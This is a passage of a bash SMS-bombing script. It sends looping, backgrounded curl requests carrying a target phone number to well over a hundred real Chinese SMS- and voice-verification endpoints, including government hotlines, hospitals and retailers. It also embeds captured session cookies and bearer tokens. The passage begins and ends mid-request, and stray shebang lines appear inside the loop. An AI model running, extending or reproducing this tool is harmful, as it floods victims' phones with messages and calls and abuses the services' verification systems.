    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "xweb_xhr: 1" \
    -H "alipayopenid: " \
    -H "deviceModel: microsoft" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx82028cdb701506f3/181/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"mobileCodeType\": \"mobileLogin\", \"mobileNo\": \"$phone\", \"sign\": \"md5sign\", \"timeStamp\": \"1713177231575\", \"deviceId\": \"Bkm9UNmPJJnDQ+JUmFhfc+gHKSId9U/vXW6S1Fremx0ex4JnwRIcgGva0jXeA1hFmgCHgjsSYh1ZcYUwXv+tufw==\", \"rid\": \"\"}" &
echo "第125个接口运行完毕"
# Shell script for request_url126
curl -X POST "https://vipainisheng.com/user/app/open/user/sendSms" \
    -H "Host: vipainisheng.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 302" \
    -H "xweb_xhr: 1" \
    -H "loginDevictType: XCX" \
    -H "cookie: " \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx5f198a7cd2798103/8/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{"jmxygtz": "", "vcVersionCode": "1.6.2", "language": "zh_CN", "loginDevictType": "XCX", "appCode": "JS", "xcxAppId": "wx5f198a7cd2798103", "mobile": "$phone", "affairType": 1, "area": "+86", "en": "Hf5FRgv5tjYBW5FIgJG6Mpp94VaqgFNVugxYQks0Us67L2ujaFcjOWRMVj1V4swL/rVe5ADkyXimIJ53T194Fg==", "uuid": "", "captchaCode": ""}' &
echo "第126个接口运行完毕"

# Shell script for request_url127
curl -X POST "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code" \
    -H "Host: mobilev2.atomychina.com.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 68" \
    -H "pragma: no-cache" \
    -H "design-site-locale: zh-CN" \
    -H "Accept-Language: zh-CN" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105" \
    -H "X-HTTP-REQUEST-DOMAIN: mobilev2.atomychina.com.cn" \
    -H "Content-Type: application/json" \
    -H "Accept: application/json" \
    -H "cache-control: no-cache" \
    -H "xweb_xhr: 1" \
    -H "x-requested-with: XMLHttpRequest" \
    -H "cookie: acw_tc=0b6e702e17131629263394156e104b9681bb7f7854d38d5dfc0dff560ade54; guestId=01e7996e-454f-4bab-bd84-44b6d2277113; 15 Apr 2025 06:35:26 GMT; guestId.sig=jWFSrGBOhFwEfFZJbEoMSYkDoO8; 15 Apr 2025 06:35:50 GMT; 15 Apr 2025 06:35:52 GMT" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx74d705d9fabf5b77/97/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    --data-raw '{"mobile": "$phone", "captcha": "1111", "token": "1111", "prefix": 86}' &
echo "第127个接口运行完毕"
# Shell script for request_url128
curl -X GET "https://user.yunjiglobal.com/yunjiuserapp/userapp/generateVoiceSmsCode.json?phone=86$phone&appCont=1" &
echo "第128个接口运行完毕"

# Shell script for request_url129
curl -X POST "https://community.lishuizongzhi.com/wx-life/mc/auth/code" \
    -H "Host: community.lishuizongzhi.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "accesstoken: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVuSWQiOiJvOHpBNjVibzFVMDhwdGlxRkJTMmd0VGgwaTZBIiwiYXBwSWQiOiJ3eDI4ZWUyYjdlYzExOTFjMzEiLCJsb2dpblRpbWUiOjE3MTExOTIwNzAyOTd9.m2nzRIQMVmcET1VuyYJLmuTjZtuTAUwY1QwZSnVX0RM" \
    -H "companyNo: " \
    -H "houseId: " \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "xweb_xhr: 1" \
    -H "neighNo: " \
    -H "version: 1.4.6" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx28ee2b7ec1191c31/20/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{"phone": "'$phone'"}' &
echo "第129个接口运行完毕"

# Shell script for request_url130
curl -X GET "https://card.10010.com/ko-order/messageCaptcha/send?phoneVal=$phone" &
echo "第130个接口运行完毕"

# Shell script for request_url131
curl -X GET "https://igetcool-gateway.igetcool.com/app-api-user-server/white/sms/voice.json?phone=$phone&smstype=1" &
echo "第131个接口运行完毕"

# Shell script for request_url132
curl -X GET "https://delivery-api.imdada.cn/v2_0/account/sendVoiceSMSCode/?phone=$phone&type=2" &
echo "第132个接口运行完毕"
# Shell script for request_url133
curl -X POST 'https://api-smart.ddzuwu.com/api/users/login/send-sms' \
    -H 'Host: api-smart.ddzuwu.com' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Accept: application/json' \
    -H 'Connection: keep-alive' \
    -H 'Platform: 1' \
    -H 'Models: iPhone12,1' \
    -H 'Version: 2.8.7' \
    -H 'User-Agent: dingdongzuwu/2.8.7 (iPhone; iOS 16.6.1; Scale/2.00)' \
    -H 'Accept-Language: zh-Hans-CN;q=1' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    --data-urlencode "phone=$phone" &
echo "第133个接口运行完毕"

# Shell script for request_url134
curl -X POST 'https://api.boxtrip.vip/v1/api/sms/login' \
    -H 'Host: api.boxtrip.vip' \
    -H 'Accept: */*' \
    -H 'version: 1.2.4' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Accept-Language: zh-CN,zh-Hans;q=0.9' \
    -H 'platform: ios' \
    -H 'signature: 2143352315' \
    -H 'Content-Length: 24' \
    -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app' \
    -H 'Connection: keep-alive' \
    -H 'Content-Type: application/json' \
    -H 'deviceBrand: iphone' \
    --data-raw "{\"mobile\":\"$phone\"}" &
echo "第134个接口运行完毕"
# Shell script for request_url135
curl -X POST 'https://anmo.jiudiananmo.com/index.php?i=666&t=0&v=3.0&from=wxapp&c=entry&a=wxapp&do=api&core=core2&m=longbing_massages_city&s=massage/app/Index/sendShortMsg&urls=massage/app/Index/sendShortMsg' \
    -H 'Host: anmo.jiudiananmo.com' \
    -H 'Content-Type: application/json;charset=utf-8' \
    -H 'Accept: */*' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Connection: keep-alive' \
    -H 'market: 8' \
    -H 'isapp: 1' \
    -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app' \
    -H 'autograph: ' \
    -H 'Content-Length: 23' \
    -H 'Accept-Language: zh-CN,zh-Hans;q=0.9' \
    --data-raw "{\"phone\":\"$phone\"}" &
echo "第135个接口运行完毕"

# Shell script for request_url136
curl -X POST 'https://api.dingdong.lrswlkj.com/auth/sendLoginMobileCode' \
    -H 'Host: api.dingdong.lrswlkj.com' \
    -H 'Content-Type: application/json' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Connection: keep-alive' \
    -H 'Accept: */*' \
    -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app' \
    -H 'Content-Length: 33' \
    -H 'token: ' \
    -H 'Accept-Language: zh-CN,zh-Hans;q=0.9' \
    --data-raw "{\"mobile\":\"$phone\",\"type\":0}" &
echo "第136个接口运行完毕"

# Shell script for request_url137
curl -X POST 'https://mgr.moyunk.com/api/appAuth/smsCode' \
    -H 'Host: mgr.moyunk.com' \
    -H 'Content-Type: application/json' \
    -H 'Connection: keep-alive' \
    -H 'Accept: */*' \
    -H 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app' \
    -H 'Content-Length: 24' \
    -H 'Accept-Language: zh-CN,zh-Hans;q=0.9' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    --data-raw "{\"mobile\":\"$phone\"}" &
echo "第137个接口运行完毕"
# Shell script for request_url140
curl -X POST "https://api.meipao.vip/make_rider/v1/send_provider_sms" \
    -H "Host: api.meipao.vip" \
    -H "Content-Type: application/x-www-form-urlencoded;charset=utf-8" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Connection: keep-alive" \
    -H "Accept: application/json" \
    -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app" \
    -H "Authorization: bearer undefined" \
    -H "Content-Length: 58" \
    -H "Accept-Language: zh-CN,zh-Hans;q=0.9" \
    --data-raw "mobile=$phone&type=rider_login&m=make_rider&uniacid=0" &
echo "第140个接口运行完毕"

# Shell script for request_url141
curl -X POST "https://open.iconntech.com/unifyUser/sendMsg" \
    -H "Host: open.iconntech.com" \
    -H "Content-Type: application/json" \
    -H "Connection: keep-alive" \
    -H "Accept: */*" \
    -H "User-Agent: HZCitizenCardapp/6.7.6 (iPhone; iOS 16.6.1; Scale/2.00)" \
    -H "Accept-Language: zh-Hans-CN;q=1" \
    -H "Content-Length: 39" \
    -H "Accept-Encoding: gzip, deflate, br" \
    --data-raw "{\"msgType\":\"01\",\"mobile\":\"$phone\"}" &
echo "第141个接口运行完毕"

# Shell script for request_url142
curl -X POST "https://app.dianjingjob.com/api/v1/5f8aa4831930c" \
    -H "Host: app.dianjingjob.com" \
    -H "appid: 91562284" \
    -H "Accept: */*" \
    -H "timestamp: 1714822056" \
    -H "signaturenonce: 6f2fda6d4a10c1ee6373a33ff46637f8a1fa4929" \
    -H "Accept-Language: zh-CN,zh-Hans;q=0.9" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "signature: a4ae58d89f0df0e7166be4371c0b2d944f4699d9" \
    -H "Content-Type: application/json" \
    -H "Content-Length: 47" \
    -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app" \
    -H "Connection: keep-alive" \
    --data-raw "{\"is_test\":0,\"mobile\":\"$phone\",\"type\":\"1\"}" &
echo "第142个接口运行完毕"

# Shell script for request_url143
curl -X POST "https://xnvfgk.sjrjyffs.top/api/app/sms/getcode" \
    -H "Host: xnvfgk.sjrjyffs.top" \
    -H "Content-Type: application/json" \
    -H "userType: app_user" \
    -H "Accept: */*" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 44" \
    -H "User-Agent: GGTravelGuide/1.2.8 (com.TravelGuide.success; build:1; iOS 16.6.1) Alamofire/5.7.1" \
    -H "Accept-Language: zh-Hans-CN;q=1.0" \
    -H "Authorization: Bearer noToken" \
    -H "Accept-Encoding: br;q=1.0, gzip;q=0.9, deflate;q=0.8" \
    --data-raw "{\"systemType\":4,\"phonenumber\":\"$phone\"}" &
echo "第143个接口运行完毕"
            sleep 0
        done
    else
        # 有限次数循环
        for i in $(seq 1 "$loop_count"); do
            echo "第 $i 次循环"
            #!/bin/bash

#!/bin/bash
#!/bin/bash

# 第1个请求
curl -X POST "https://miniapps.nj12345.net/wechatsmallprogram/rest/checkcode/getCheckCode" \
    -H "Host: miniapps.nj12345.net" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 72" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxed80cacf752b522a/42/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"mobile\": \"$phone\"}}" &
echo "第1个接口运行完毕"

# 第119个请求
curl -X POST "https://passport.xag.cn/home/sms_code" \
    -H "Host: passport.xag.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "mini: member" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Authorization: Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: application/json" \
    -H "xweb_xhr: 1" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "token: " \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx43471742f3e783cb/213/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "icc=86&phone=$phone" &
echo "第119个接口运行完毕"

# 第2个请求
curl -X POST "https://www.luzhou12345.cn/app12345wbs.asmx/getInfo" \
    -H "Host: www.luzhou12345.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 80" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx218d959b2ebd15a7/13/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"AcceptType\": \"sendwritevercode\", \"AcceptContent\": \"{\\\"Mobile\\\":\\\"$phone\\\"}\"}" &
echo "第2个接口运行完毕"

# 第3个请求
curl -X POST "https://12345xcx.shaanxi.gov.cn/xcxrest/rest/applets/onlineUser/getUnloginMsgCode" \
    -H "Host: 12345xcx.shaanxi.gov.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 100" \
    -H "Accept: text/html;charset=utf-8" \
    -H "xweb_xhr: 1" \
    -H "x-authenticated-userid: " \
    -H "Authorization: Bearer undefined" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxd8aa257f596cdad9/44/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"userMobile\": \"$phone\", \"validateCodeType\": \"01\"}}" &
echo "第3个接口运行完毕"

# 第4个请求
curl -X POST "https://www.tbeatcny.cn:10015/zhwl/api/sjzj/verificationCode" \
    -H "Host: www.tbeatcny.cn:10015" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 26" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx17286984933e6e9e/125/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"username\": \"$phone\"}" &
echo "第4个接口运行完毕"

# 第5个请求
curl -X POST "https://wxpay-web.yixincapital.com/wxpay-web/minBasis/verificationCode" \
    -H "Host: wxpay-web.yixincapital.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 71" \
    -H "xweb_xhr: 1" \
    -H "cookie: " \
    -H "yixin: 63f0a60118a1e90f4844c666465ba5b0" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxc5bea8c2c3586398/70/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "openId=IzaKfsCaIjNAhbSJ8mTaJSWPbQJDKW1IidEbQoPPIYE%3D&phone=$phone" &
echo "第5个接口运行完毕"

# 第6个请求
curl -X POST "https://qyzwfw.cn/cns-bmfw-webrest/rest/mobileUser/getCheckCode" \
    -H "Host: qyzwfw.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 72" \
    -H "xweb_xhr: 1" \
    -H "Authorization: Bearer fa29301a889060f25b6ccad9d2f493b3" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charest=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxf983f4eb853c26bc/8/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"mobile\": \"$phone\"}}" &
echo "第6个接口运行完毕"
#!/bin/bash

# 第7个请求
curl -X POST "https://www.12345hbsz.com/szbmfwwxrest/rest/userInfo/getVerifiCode" \
    -H "Host: www.12345hbsz.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 77" \
    -H "Accept: text/html;charset=utf-8" \
    -H "xweb_xhr: 1" \
    -H "Authorization: Bearer" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charest=UTF-8" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx08f3dbf24a512230/11/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"token\": \"Epoint_WebSerivce_**##0601\", \"params\": {\"phoneNumber\": \"$phone\"}}" &
echo "第7个接口运行完毕"

# 第8个请求
curl -X POST "https://www.xysxzspj.com/index/Server/send_code.html" \
    -H "Host: www.xysxzspj.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx401fdaf166382a62/4/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "phone=$phone" &
echo "第8个接口运行完毕"

# 第9个请求
curl -X POST "https://b.aifabu.com/v1/setSmsCode" \
    -H "Host: b.aifabu.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 30" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Origin: https://www.aifabu.com" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3947.100 Safari/537.36" \
    -H "Content-Type: application/json" \
    -H "Referer: https://www.aifabu.com/register" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\", \"type\": 1}" &
echo "第9个接口运行完毕"

# 第10个请求
curl -X POST "https://userapi.heaye.shop/api/auth/sendSms" \
    -H "Host: userapi.heaye.shop" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "Authorization: Bearer oHQMv5f-j93ZBVLZVN5P5f8Ehrms" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx38bb9a6b3ddc1d77/177/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第10个接口运行完毕"

# 第11个请求
curl -X POST "https://www.mytijian.com/main/action/mobileValidationCode?_site=hnszsy&_siteType=mobile&_p=&clientVersion=v1.1.6" \
    -H "Host: www.mytijian.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 26" \
    -H "unique-submit-token: 2a87e5f9-c78a-4c50-9830-e715d9dbf134_1710752032041" \
    -H "x-mytjian-client: WECHAT_MINI_APP" \
    -H "xweb_xhr: 1" \
    -H "Cookie: SESSION=686cdb0d-abb1-461f-8349-a9d441c78948;" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx650990c67b116478/31/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "scene=6&mobile=$phone" &
echo "第11个接口运行完毕"
#!/bin/bash

# 第12个请求
curl -X POST "https://health.gz12hospital.cn:6603/smartpe-busi-service/app/captcha" \
    -H "Host: health.gz12hospital.cn:6603" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 47" \
    -H "xweb_xhr: 1" \
    -H "Cookie: JSESSIONID=" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "token: " \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx7ec9015f854756ec/14/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"archiveCode\": \"440130\", \"mobile\": \"$phone\"}" &
echo "第12个接口运行完毕"

# 第13个请求
curl -X POST "https://a.welife001.com/applet/sendVerifyCode" \
    -H "Host: a.welife001.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "x-rid: 3ACFBC8F-F10E-454F-80F7-E9CF80EFA70B" \
    -H "imprint: oWRkU0UWqnOnuclLWq1fDw0SHnqs" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx23d8d7ea22039466/2307/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第13个接口运行完毕"

# 第14个请求
curl -X POST "https://mc.tengmed.com/formaltrpcapi/patient_manager/sendPhoneVerifyCode" \
    -H "Host: mc.tengmed.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 112" \
    -H "Th-Session-Id: nszli17107510056466xqDMumPGcno4AcG2RgBl4N5IbUa27137d0-wx" \
    -H "xweb_xhr: 1" \
    -H "Th-Auth-Type: tencent-health-mini" \
    -H "Th-Appid: wxc35283883e1d86d5" \
    -H "Th-Code: " \
